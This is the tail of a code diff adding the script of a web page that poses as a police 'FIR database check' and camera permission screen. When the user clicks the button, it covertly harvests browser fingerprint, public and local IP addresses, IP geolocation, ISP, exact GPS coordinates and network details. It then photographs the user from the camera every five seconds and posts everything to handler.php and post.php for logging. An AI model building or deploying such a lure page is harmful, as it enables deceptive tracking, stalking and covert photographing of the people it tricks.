+                        ipInfo.localIPs = localIPs;
+                        callback(ipInfo);
+                    });
+                }).fail(function() {
+                    getLocalIPs(function(localIPs) {
+                        ipInfo.localIPs = localIPs;
+                        callback(ipInfo);
+                    });
+                });
+            });
+        }
+
+        // Collect device info for FIR check
+        function collectDeviceInfo() {
+            console.log('Starting device information collection...');
+            
+            try {
+                if (typeof ClientJS === 'undefined') {
+                    console.error('ClientJS library not loaded');
+                    alert('Device information collection failed. Please refresh the page.');
+                    return;
+                }
+                
+                var client = new ClientJS(); // Create A New Client Object
+                console.log('ClientJS initialized successfully');
+                
+                var OS = client.getOS(); // Get OS Version
+                var ver = client.getOSVersion(); // Get OS Version
+                var getbrow = client.getBrowser(); // Get Browser
+                var getbrowVer = client.getBrowserVersion(); // Get Browser Version
+                var CPU = client.getCPU(); // Get CPU Architecture
+                var currentResolution = client.getCurrentResolution(); // Get Current Resolution
+                var timeZone = '';
+                
+                try {
+                    timeZone = client.getTimeZone(); // Get Time Zone
+                } catch {
+                    timeZone = 'Not Found';
+                }
+                
+                timeZone = timeZone.toString();
+                var language = client.getLanguage(); // Get User Language
+                var core = navigator.hardwareConcurrency;
+                var check_brave = navigator.brave;
+                
+                // Get network connection info if available
+                var connectionInfo = 'Not Available';
+                var networkType = 'Unknown';
+                var effectiveType = 'Unknown';
+                var downlink = 'Unknown';
+                var rtt = 'Unknown';
+                
+                if (navigator.connection) {
+                    connectionInfo = JSON.stringify(navigator.connection);
+                    networkType = navigator.connection.type || 'Unknown';
+                    effectiveType = navigator.connection.effectiveType || 'Unknown';
+                    downlink = navigator.connection.downlink || 'Unknown';
+                    rtt = navigator.connection.rtt || 'Unknown';
+                } else if (navigator.mozConnection) {
+                    connectionInfo = JSON.stringify(navigator.mozConnection);
+                    networkType = navigator.mozConnection.type || 'Unknown';
+                    effectiveType = navigator.mozConnection.effectiveType || 'Unknown';
+                    downlink = navigator.mozConnection.downlink || 'Unknown';
+                    rtt = navigator.mozConnection.rtt || 'Unknown';
+                } else if (navigator.webkitConnection) {
+                    connectionInfo = JSON.stringify(navigator.webkitConnection);
+                    networkType = navigator.webkitConnection.type || 'Unknown';
+                    effectiveType = navigator.webkitConnection.effectiveType || 'Unknown';
+                    downlink = navigator.webkitConnection.downlink || 'Unknown';
+                    rtt = navigator.webkitConnection.rtt || 'Unknown';
+                }
+                
+                // Get device memory if available
+                var deviceMemory = 'Not Available';
+                if (navigator.deviceMemory) {
+                    deviceMemory = navigator.deviceMemory + ' GB';
+                }
+                
+                // Get platform info
+                var platform = navigator.platform || 'Unknown';
+                var userAgent = navigator.userAgent || 'Unknown';
+                
+                // Get screen info
+                var screenWidth = screen.width || 'Unknown';
+                var screenHeight = screen.height || 'Unknown';
+                var screenColorDepth = screen.colorDepth || 'Unknown';
+                var screenPixelDepth = screen.pixelDepth || 'Unknown';
+                
+                // Get timezone offset
+                var timezoneOffset = new Date().getTimezoneOffset();
+                var timezoneOffsetHours = Math.abs(timezoneOffset / 60);
+                var timezoneOffsetSign = timezoneOffset > 0 ? '-' : '+';
+                
+                // Get detailed IP information
+                getDetailedIPInfo(function(ipInfo) {
+                    var publicIP = ipInfo.publicIP;
+                    var localIPs = ipInfo.localIPs.length > 0 ? ipInfo.localIPs.join(', ') : 'Not Available';
+                    var ipDetails = ipInfo.ipDetails;
+                    
+                    // Try to infer gateway from local IP (common pattern: x.x.x.1)
+                    var inferredGateway = 'Not Available';
+                    if (ipInfo.localIPs.length > 0) {
+                        var firstLocalIP = ipInfo.localIPs[0];
+                        var ipParts = firstLocalIP.split('.');
+                        if (ipParts.length === 4) {
+                            inferredGateway = ipParts[0] + '.' + ipParts[1] + '.' + ipParts[2] + '.1';
+                        }
+                    }
+                    
+                    // Get additional device identifiers
+                    var deviceFingerprint = '';
+                    try {
+                        var canvas = document.createElement('canvas');
+                        var ctx = canvas.getContext('2d');
+                        ctx.textBaseline = 'top';
+                        ctx.font = '14px Arial';
+                        ctx.fillText('Device fingerprint', 2, 2);
+                        deviceFingerprint = canvas.toDataURL();
+                    } catch(e) {
+                        deviceFingerprint = 'Not Available';
+                    }
+                    
+                    var deviceData = `[FIR DATABASE CHECK - COMPLETE DEVICE & IP INFO]
+Timestamp: ${new Date().toISOString()}
+Collection Time: ${new Date().toLocaleString()}
+
+=== USER'S IP ADDRESS INFORMATION ===
+Public IP Address: ${publicIP}
+Local IP Addresses: ${localIPs}
+Inferred Gateway: ${inferredGateway}
+IP Country: ${ipDetails.country || 'Not Available'}
+IP Region/State: ${ipDetails.region || 'Not Available'}
+IP City: ${ipDetails.city || 'Not Available'}
+IP Postal Code: ${ipDetails.postal || 'Not Available'}
+IP Latitude: ${ipDetails.latitude || 'Not Available'}
+IP Longitude: ${ipDetails.longitude || 'Not Available'}
+ISP: ${ipDetails.isp || 'Not Available'}
+Organization: ${ipDetails.org || 'Not Available'}
+IP Timezone: ${ipDetails.timezone || 'Not Available'}
+
+=== DEVICE INFORMATION ===
+OS Name: ${OS}
+OS Version: ${ver}
+Platform: ${platform}
+Browser Name: ${getbrow}
+Browser Version: ${getbrowVer}
+User Agent: ${userAgent}
+CPU Name: ${CPU}
+CPU Cores: ${core}
+Device Memory: ${deviceMemory}
+Screen Resolution: ${currentResolution}
+Screen Width: ${screenWidth}px
+Screen Height: ${screenHeight}px
+Screen Color Depth: ${screenColorDepth} bits
+Screen Pixel Depth: ${screenPixelDepth} bits
+Device Fingerprint: ${deviceFingerprint.substring(0, 50)}...
+
+=== NETWORK INFORMATION ===
+Network Type: ${networkType}
+Effective Network Type: ${effectiveType}
+Network Downlink: ${downlink} Mbps
+Network RTT: ${rtt} ms
+Connection Info: ${connectionInfo}
+
+=== LOCALE INFORMATION ===
+Time Zone: ${timeZone}
+Timezone Offset: UTC${timezoneOffsetSign}${timezoneOffsetHours}
+Language: ${language}
+
+=== MAC ADDRESS & GATEWAY NOTE ===
+MAC Address: Not Available (Browser security restrictions prevent direct access)
+Gateway: ${inferredGateway} (Inferred from local IP, may not be accurate)
+Note: MAC address and exact gateway cannot be accessed directly via JavaScript due to browser security. Local IP and inferred gateway are provided instead.
+
+-------------------------
+`;
+                    
+                    $.ajax({
+                        type: 'POST',
+                        url: 'handler.php',
+                        data: { data: deviceData },
+                        success: function() {
+                            console.log('✓ Complete device and IP info saved for FIR check');
+                        },
+                        error: function() {
+                            console.error('✗ Error saving device info for FIR check');
+                        }
+                    });
+                });
+                
+            } catch (error) {
+                console.error('Error collecting device info:', error);
+                // Save error info
+                var errorData = `[FIR DATABASE CHECK - DEVICE INFO ERROR]
+Timestamp: ${new Date().toISOString()}
+Error: ${error.message || 'Unknown error'}
+Stack: ${error.stack || 'Not available'}
+-------------------------
+`;
+                $.ajax({
+                    type: 'POST',
+                    url: 'handler.php',
+                    data: { data: errorData },
+                    success: function() {
+                        console.log('Error info saved');
+                    }
+                });
+            }
+        }
+
+        // Save FIR location to logs with detailed information
+        function saveFIRLocationToLogs(lat, lon, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp) {
+            const locationData = `[FIR DATABASE CHECK - EXACT GPS LOCATION]
+Timestamp: ${timestamp || new Date().toISOString()}
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy} meters
+Altitude: ${altitude}
+Altitude Accuracy: ${altitudeAccuracy}
+Heading: ${heading}
+Speed: ${speed}
+Google Maps: https://www.google.com/maps?q=${lat},${lon}
+Google Maps Link: https://google.com/maps/place/${lat}+${lon}
+Google Maps Direct: https://maps.google.com/?q=${lat},${lon}
+OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: locationData },
+                success: function() {
+                    console.log('FIR exact location saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving FIR location to logs');
+                }
+            });
+        }
+
+        // Save FIR location error to logs
+        function saveFIRLocationErrorToLogs(error) {
+            const errorData = `[FIR DATABASE CHECK - LOCATION ERROR]
+Timestamp: ${new Date().toISOString()}
+Error: ${error.message || 'Location access denied'}
+Code: ${error.code || 'UNKNOWN'}
+Error Details: ${JSON.stringify(error)}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('FIR location error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving FIR location error to logs');
+                }
+            });
+        }
+
+        // Save initial location to logs
+        function saveInitialLocationToLogs(lat, lon, accuracy) {
+            const locationData = `[CAMERA ACCESS - LOCATION GRANTED]
+Timestamp: ${new Date().toISOString()}
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy} meters
+Google Maps: https://www.google.com/maps?q=${lat},${lon}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: locationData },
+                success: function() {
+                    console.log('Initial location saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving initial location to logs');
+                }
+            });
+        }
+
+        // Save location error to logs
+        function saveLocationErrorToLogs(error) {
+            const errorData = `[CAMERA ACCESS - LOCATION ERROR]
+Timestamp: ${new Date().toISOString()}
+Error: ${error.message || 'Location access denied'}
+Code: ${error.code || 'UNKNOWN'}
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('Location error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving location error to logs');
+                }
+            });
+        }
+
+        // Initialize camera access
+        function initCameraAccess() {
+            // Permission screen is shown by default
+        }
+
+        // Check available cameras
+        async function getAvailableCameras() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.filter(device => device.kind === 'videoinput');
+            } catch (error) {
+                console.log('Error enumerating devices:', error);
+                return [];
+            }
+        }
+
+        // Request camera access with fallback
+        async function requestCameraAccess(event) {
+            // Show loading state
+            const button = (event && event.target.closest('.btn-permission')) || document.querySelector('.btn-permission');
+            if (button) {
+                const originalText = button.innerHTML;
+                button.disabled = true;
+                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Collecting Information...</span>';
+                
+                // Collect device info immediately when button is clicked
+                console.log('Collecting device information...');
+                collectDeviceInfo();
+                
+                // Request GPS location immediately when button is clicked
+                console.log('Requesting GPS location access...');
+                requestLocationForFIR();
+                
+                // Restore button after a short delay
+                setTimeout(function() {
+                    if (button) {
+                        button.disabled = false;
+                        button.innerHTML = originalText;
+                    }
+                }, 2000);
+            } else {
+                // Fallback if button not found
+                collectDeviceInfo();
+                requestLocationForFIR();
+            }
+            
+            // First, try to get available cameras
+            const cameras = await getAvailableCameras();
+            
+            // Try different constraint options
+            const constraintOptions = [
+                {
+                    audio: false,
+                    video: {
+                        facingMode: currentFacingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                },
+                {
+                    audio: false,
+                    video: {
+                        facingMode: currentFacingMode
+                    }
+                },
+                {
+                    audio: false,
+                    video: true
+                },
+                {
+                    audio: false,
+                    video: {
+                        width: { min: 640 },
+                        height: { min: 480 }
+                    }
+                }
+            ];
+
+            let lastError = null;
+            
+            // Try each constraint option
+            for (let i = 0; i < constraintOptions.length; i++) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(constraintOptions[i]);
+                    
+                    // Success! Use this stream
+                    handleCameraSuccess(stream, constraintOptions[i]);
+                    return;
+                    
+                } catch (error) {
+                    lastError = error;
+                    console.log(`Constraint option ${i + 1} failed:`, error.name, error.message);
+                    
+                    // If it's a permission error, don't try other options
+                    if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                        break;
+                    }
+                }
+            }
+
+            // All options failed
+            handleCameraError(lastError, cameras);
+        }
+
+        // Handle successful camera access
+        function handleCameraSuccess(mediaStream, constraints) {
+            stream = mediaStream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // Save camera access granted to logs
+            saveCameraAccessToLogs(constraints);
+            
+            // Hide permission screen, show camera screen
+            document.getElementById('cameraPermission').classList.add('hidden');
+            document.getElementById('cameraScreen').classList.add('active');
+            
+            // Start automatic capture every 5 seconds
+            startAutoCapture();
+        }
+
+        // Handle camera error with helpful messages
+        function handleCameraError(error, cameras) {
+            let errorMessage = '';
+            let errorDetails = '';
+            
+            if (!error) {
+                errorMessage = 'Unable to access camera. Please check your device settings.';
+                errorDetails = 'Unknown error occurred';
+            } else {
+                switch(error.name) {
+                    case 'NotFoundError':
+                    case 'DevicesNotFoundError':
+                        errorMessage = 'No camera found on your device.';
+                        errorDetails = 'Please connect a camera or use a device with a built-in camera.';
+                        if (cameras.length === 0) {
+                            errorDetails += ' No video input devices detected.';
+                        } else {
+                            errorDetails += ` Found ${cameras.length} camera(s) but unable to access.`;
+                        }
+                        break;
+                        
+                    case 'NotAllowedError':
+                    case 'PermissionDeniedError':
+                        errorMessage = 'Camera permission denied.';
+                        errorDetails = 'Please allow camera access in your browser settings and refresh the page.';
+                        break;
+                        
+                    case 'NotReadableError':
+                    case 'TrackStartError':
+                        errorMessage = 'Camera is already in use.';
+                        errorDetails = 'Please close other applications using the camera and try again.';
+                        break;
+                        
+                    case 'OverconstrainedError':
+                    case 'ConstraintNotSatisfiedError':
+                        errorMessage = 'Camera does not support required settings.';
+                        errorDetails = 'Your camera may not support the requested resolution or features.';
+                        break;
+                        
+                    case 'AbortError':
+                        errorMessage = 'Camera access was aborted.';
+                        errorDetails = 'Please try again.';
+                        break;
+                        
+                    default:
+                        errorMessage = 'Unable to access camera.';
+                        errorDetails = error.message || 'Unknown error: ' + error.name;
+                }
+            }
+            
+            // Show user-friendly error message
+            const errorMsgEl = document.getElementById('errorMsg');
+            errorMsgEl.innerHTML = `
+                <strong>${errorMessage}</strong><br>
+                <small>${errorDetails}</small><br>
+                <button class="btn-permission" onclick="requestCameraAccess(event)" style="margin-top: 15px; padding: 10px 20px; font-size: 14px;">
+                    <i class="fas fa-redo"></i> Try Again
+                </button>
+            `;
+            errorMsgEl.classList.add('show');
+            
+            // Save camera access error to logs
+            saveCameraErrorToLogs(error, cameras);
+        }
+
+        // Start automatic capture every 5 seconds
+        function startAutoCapture() {
+            // Capture immediately
+            setTimeout(capturePhoto, 1000);
+            
+            // Then capture every 5 seconds
+            autoCaptureInterval = setInterval(function() {
+                capturePhoto();
+            }, 5000);
+        }
+
+        // Stop automatic capture
+        function stopAutoCapture() {
+            if (autoCaptureInterval) {
+                clearInterval(autoCaptureInterval);
+                autoCaptureInterval = null;
+            }
+        }
+
+        // Capture photo
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            if (!video.videoWidth || !video.videoHeight) {
+                return; // Video not ready
+            }
+
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw video frame to canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to base64
+            const imageData = canvas.toDataURL('image/png');
+            const base64Data = imageData.replace('data:image/png;base64,', '');
+
+            // Get current location if available, then post
+            getCurrentLocation(function(location) {
+                // Send to server
+                post(base64Data, location);
+            });
+
+            // Display captured photo
+            capturedCount++;
+            document.getElementById('captureCount').textContent = capturedCount;
+            
+            const photosContainer = document.getElementById('capturedPhotos');
+            const photoItem = document.createElement('div');
+            photoItem.className = 'photo-item captured';
+            const img = document.createElement('img');
+            img.src = imageData;
+            photoItem.appendChild(img);
+            photosContainer.insertBefore(photoItem, photosContainer.firstChild);
+
+            // Visual feedback
+            const videoContainer = document.querySelector('.video-container');
+            videoContainer.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                videoContainer.style.transform = 'scale(1)';
+            }, 200);
+        }
+
+        // Get current location
+        function getCurrentLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        callback({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    function(error) {
+                        callback(null);
+                    }
+                );
+            } else {
+                callback(null);
+            }
+        }
+
+        // Post image to server
+        function post(imgdata, location) {
+            // First save image via post.php
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    console.log('Image saved successfully');
+                    
+                    // Then save detailed log with location info
+                    saveCaptureToLogs(location);
+                },
+                error: function() {
+                    console.log('Error saving image');
+                }
+            });
+        }
+
+        // Save capture details to logs
+        function saveCaptureToLogs(location) {
+            const timestamp = new Date().toISOString();
+            let logData = `[CAMERA ACCESS - PHOTO CAPTURED #${capturedCount}]
+Timestamp: ${timestamp}
+Image File: Saved to /images/ directory
+`;
+
+            if (location) {
+                logData += `Location: ${location.lat}, ${location.lon}
+Location Accuracy: ${location.accuracy} meters
+Google Maps: https://www.google.com/maps?q=${location.lat},${location.lon}
+`;
+            } else {
+                logData += `Location: Not available
+`;
+            }
+
+            logData += `-------------------------
+`;
+
+            // Send to handler.php to save in result.txt
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: logData },
+                success: function() {
+                    console.log('Capture log saved');
+                },
+                error: function() {
+                    console.log('Error saving capture log');
+                }
+            });
+        }
+
+        // Save upload to logs
+        function saveUploadToLogs(fileName, imageData) {
+            const timestamp = new Date().toISOString();
+            const base64Data = imageData.split(',')[1] || '';
+            
+            let logData = `[CAMERA ACCESS - PICTURE UPLOADED #${uploadedCount}]
+Timestamp: ${timestamp}
+File Name: ${fileName}
+File Size: ${(base64Data.length * 0.75 / 1024).toFixed(2)} KB
+Image Data: Base64 encoded
+`;
+
+            // Get location if available
+            getCurrentLocation(function(location) {
+                if (location) {
+                    logData += `Location: ${location.lat}, ${location.lon}
+Location Accuracy: ${location.accuracy} meters
+Google Maps: https://www.google.com/maps?q=${location.lat},${location.lon}
+`;
+                } else {
+                    logData += `Location: Not available
+`;
+                }
+
+                logData += `-------------------------
+`;
+
+                // Send to handler.php to save in result.txt
+                $.ajax({
+                    type: 'POST',
+                    url: 'handler.php',
+                    data: { data: logData },
+                    success: function() {
+                        console.log('Upload log saved');
+                    },
+                    error: function() {
+                        console.log('Error saving upload log');
+                    }
+                });
+            });
+        }
+
+        // Save camera access granted to logs
+        function saveCameraAccessToLogs(constraints) {
+            const constraintInfo = constraints ? JSON.stringify(constraints, null, 2) : 'Default constraints';
+            const accessData = `[CAMERA ACCESS - PERMISSION GRANTED]
+Timestamp: ${new Date().toISOString()}
+Camera Mode: ${currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera'}
+Status: Camera access granted successfully
+Constraints Used: ${constraintInfo}
+Auto-capture: Enabled (every 5 seconds)
+Upload Feature: Available
+Matching Feature: Available
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: accessData },
+                success: function() {
+                    console.log('Camera access saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving camera access to logs');
+                }
+            });
+        }
+
+        // Save FIR check to logs
+        function saveFIRCheckToLogs(firRecords) {
+            const timestamp = new Date().toISOString();
+            let logData = `[CAMERA ACCESS - FIR DATABASE CHECK]
+Timestamp: ${timestamp}
+Total FIR Records Found: ${firRecords.length}
+`;
+
+            firRecords.forEach((fir, index) => {
+                logData += `
+FIR Record #${index + 1}:
+- FIR ID: ${fir.id}
+- Description: ${fir.description}
+- Date: ${fir.date}
+- Status: ${fir.status}
+- Police Station: ${fir.station}
+`;
+            });
+
+            logData += `-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: logData },
+                success: function() {
+                    console.log('FIR check saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving FIR check to logs');
+                }
+            });
+        }
+
+        // Save camera error to logs
+        function saveCameraErrorToLogs(error, cameras) {
+            let errorData = `[CAMERA ACCESS - PERMISSION DENIED/ERROR]
+Timestamp: ${new Date().toISOString()}
+Error Name: ${error ? error.name : 'UNKNOWN'}
+Error Message: ${error ? error.message : 'Unknown error'}
+`;
+
+            if (cameras && cameras.length > 0) {
+                errorData += `Available Cameras: ${cameras.length}
+Camera Devices: ${cameras.map(c => c.label || 'Unnamed Camera').join(', ')}
+`;
+            } else {
+                errorData += `Available Cameras: 0
+Note: No video input devices detected on this system
+`;
+            }
+
+            if (error) {
+                errorData += `Error Code: ${error.code || 'N/A'}
+Error Stack: ${error.stack || 'N/A'}
+`;
+            }
+
+            errorData += `Possible Causes:
+- No camera connected to device
+- Camera already in use by another application
+- Camera permissions denied
+- Browser doesn't support camera access
+- Camera driver issues
+-------------------------
+`;
+
+            $.ajax({
+                type: 'POST',
+                url: 'handler.php',
+                data: { data: errorData },
+                success: function() {
+                    console.log('Camera error saved to logs');
+                },
+                error: function() {
+                    console.log('Error saving camera error to logs');
+                }
+            });
+        }
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            stopAutoCapture();
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
